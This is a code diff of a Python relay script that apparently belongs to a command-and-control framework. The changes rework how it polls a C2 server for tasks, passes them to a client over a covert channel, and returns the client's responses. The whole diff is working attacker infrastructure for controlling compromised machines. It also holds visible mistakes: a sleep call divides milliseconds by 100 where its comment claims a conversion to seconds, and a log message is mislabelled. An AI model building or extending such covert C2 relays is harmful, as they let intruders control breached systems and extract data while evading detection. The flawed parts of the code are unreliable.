@@ -110,8 +110,6 @@ class commonUtils(object):
 	def retrieveData():
 		# This will retireve data via the covert channel
 		# Returns unencoded data
-		
-		# TODO: Logic to retrieve info via the covert channel goes here, store that in data
 
 		data = transport.retrieveData()
 
@@ -249,30 +247,7 @@ class establishedSession(object):
 		"""
 		Poll the c2 server for new tasks
 		"""
-		# recvdTask = None
-		# while recvdTask is None:
-		# 	taskCheck = commonUtils.recvFrameFromC2(sock)
 
-		# 	if taskCheck == None:
-		# 		# Sleep for x amount of time. If we didn't get anything, restarts the loop
-		# 		if args.debug:
-		# 			print (commonUtils.color("NO TASK RECIEVED, SLEEPING FOR ", status=False, yellow=True) + "%s seconds") % (str(IDLE_TIME))
-		# 		sleep(IDLE_TIME)
-		# 	else:
-		# 		# Our data is already decoded, end the loop by assining it to recvdTask
-		# 		recvdTask = taskCheck
-		# 		if args.verbose:
-		# 			print (commonUtils.color("Recieved new task from C2 server! ") + "(%s bytes)") % (str(len(recvdTask)))
-		# 		if args.debug:
-		# 			print (commonUtils.color("NEW TASK: ", status=False, yellow=True) + "%s") % (recvdTask)
-
-		# return recvdTask
-
-		##
-
-		# Retrying this with the client's "check beacon" logic:
-		# again, I have no idea what I'm doing
-		##########
 		chunk = commonUtils.recvFrameFromC2(sock)
 		if chunk < 0:
 			if args.debug:
@@ -302,20 +277,19 @@ class establishedSession(object):
 		"""
 		Check the covert channel for a response from the client
 		"""
-		recvdResponse = None
-		while recvdResponse is None:
-			respCheck = commonUtils.retrieveData() # will already be decoded
-			if respCheck == None:
-				if args.debug:
-					print (commonUtils.color("NO RESPONSE RECIEVED, SLEEPING FOR ", status=False, yellow=True) + "%s seconds") % (str(IDLE_TIME))
-				# Sleep for x amount of time. If we didn't get anything, restart the loop
-				sleep(IDLE_TIME)
+
+		recvdResponse = commonUtils.retrieveData()
+		if args.debug:
+			if len(recvdResponse) > 1:
+				print (commonUtils.color("Recieved %d bytes from client", status=False, yellow=True)) % (len(recvdResponse))
 			else:
-				recvdResponse = respCheck
-				if args.verbose:
-					print (commonUtils.color("Recieved response from client! ") + "(%s bytes)") % (str(len(recvdResponse)))
-				if args.debug:
-					print (commonUtils.color("CLIENT RESPONSE: ", status=False, yellow=True) + "%s") % (recvdResponse)
+				print (commonUtils.color("Recieved empty response from client", status=False, yellow=True))
+		if len(recvdResponse) > 1:
+			if args.verbose:
+				print (commonUtils.color("Recieved new task from C2 server!") + "(%s bytes)") % (str(len(recvdResponse)))
+			if args.debug:
+				print (commonUtils.color("RESPONSE: ", status=False, yellow=True) + "%s") % (recvdResponse)
+
 
 		return recvdResponse
 
@@ -393,21 +367,18 @@ def main():
 
 			newTask = establishedSession.checkForTasks(sock)
 
-			if len(newTask) > 1:
-				# once we have a new task, lets relay that to our client
-				if args.debug:
-					print commonUtils.color("Encoding and relaying task to client", status=False, yellow=True)
-				establishedSession.relayTask(newTask)
-				# Attempt to retrieve a response from the client
-				# TODO: Probably need logic to handle large/chunked responses
-				if args.verbose:
-					print commonUtils.color("Checking the client for a response...")
-				b_response = establishedSession.checkForResponse()
+			# once we have a new task (even an empty one), lets relay that to our client
+			if args.debug:
+				print commonUtils.color("Encoding and relaying task to client", status=False, yellow=True)
+			establishedSession.relayTask(newTask)
+			# Attempt to retrieve a response from the client
+			if args.verbose:
+				print commonUtils.color("Checking the client for a response...")
+			b_response = establishedSession.checkForResponse()
 
-				# Let's relay this response to the c2 server
-				establishedSession.relayResponse(sock, b_response)
-			else:
-				sleep(1.5)
+			# Let's relay this response to the c2 server
+			establishedSession.relayResponse(sock, b_response)
+			sleep(C2_BLOCK_TIME/100) # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
 
 
 			# Restart this loop
